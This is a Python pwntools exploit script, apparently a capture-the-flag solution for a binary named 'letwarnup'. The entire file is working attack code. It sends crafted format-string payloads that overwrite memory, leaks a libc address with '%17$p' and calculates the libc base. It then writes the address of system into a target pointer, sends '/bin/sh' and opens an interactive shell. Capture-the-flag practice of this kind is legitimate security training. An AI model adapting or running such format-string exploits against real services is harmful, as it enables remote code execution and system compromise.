#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

def conn():
	local = 0
	debug = 0

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./letwarnup')
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x000000000040122a
				b*0x0000000000401220
				c
				c
				c
				c
				c
				c
				c
				c
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('', 10000)

	return s

s = conn()

elf = ELF('letwarnup')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

payload = b'%c%c%c%c%c%c%4210746c%lln%53743c%hn'

s.sendlineafter(b'Enter your string:\n', payload)

for i in range(1040):
	s.recv()

payload = b'%17$p'

s.sendlineafter(b'Enter your string:\n', payload)

libc.address = int(s.recv(14).decode(), 16) - libc.symbols['__libc_start_main'] - 243

log.info('Libc base: 0x%x', libc.address)

s.sendlineafter(b'Enter your string:\n', b'%c%c%c%c%c%c%4210714c%lln')
s.sendlineafter(b'Enter your string:\n', b'%c%c%c%c%c%c%4210716c%lln')

target1 = (libc.symbols['system'] & 0xff0000) >> 16
target2 = libc.symbols['system'] & 0xffff

log.info('Target1: 0x%x', target1)
log.info('Target2: 0x%x', target2)

if target1 < 14:
	log.info('Fail: Target1 < 14')
	s.close()
	exit(0)

payload = '%c%c%c%c%c%c%c%c%c%c%c%c%c%c%' + str(target1 - 14) + 'c%hhn%c%c%c%c%' + str(target2 - target1 - 4) + 'c%hn'

s.sendlineafter(b'Enter your string:\n', bytes(payload, 'utf-8'))

s.sendlineafter(b'Enter your string:\n', b'/bin/sh\x00')

s.interactive()
